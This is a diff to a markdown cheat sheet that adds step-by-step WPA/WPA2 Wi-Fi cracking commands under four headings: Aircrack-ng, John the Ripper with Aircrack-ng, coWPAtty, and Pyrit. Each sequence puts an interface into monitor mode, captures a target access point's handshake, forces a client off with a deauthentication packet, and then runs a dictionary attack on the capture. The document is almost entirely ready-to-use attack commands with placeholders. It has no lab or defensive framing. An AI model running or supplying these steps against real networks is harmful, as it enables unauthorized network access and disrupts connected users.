@@ -1,18 +1,40 @@
 
-## Attack Steps
-
-   
-   
 ## Cracking with Aircrack-ng
 
-   #
-  
-  
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   aircrack-ng -w <wordlist> <capture>
+   
+   
 ## Cracking with JTR and Aircrack-ng
-  
+
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture>
   
   
 ## Cracking with  coWPAtty
   
+   airmon-ng start <interface> <AP channel>
+   airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   cowpatty -r <capture> -f <wordlist> -2 -s <ESSID>
+   genpmk -f <wordlist> -d <hashes filename> -s <ESSID>
+   cowpatty -r <capture> -d <hashes filename> -2 -s <ESSID>
+ 
+    
   
-## Cracking with  Pyrit? 
+## Cracking with Pyrit
+
+   airmon-ng start <interface> <AP channel>
+   pyrit -r <interface> -o <capture> stripLive
+   aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+   pyrit -r <capture> -i <wordlist> -b <AP MAC> attack_passthrough
+   pyrit -i <wordlist> import_passwords
+   pyrit -e <ESSID> create_essid
+   pyrit batch
+   pyrit -r <capture> -b <AP MAC> attack_db
+   
+   
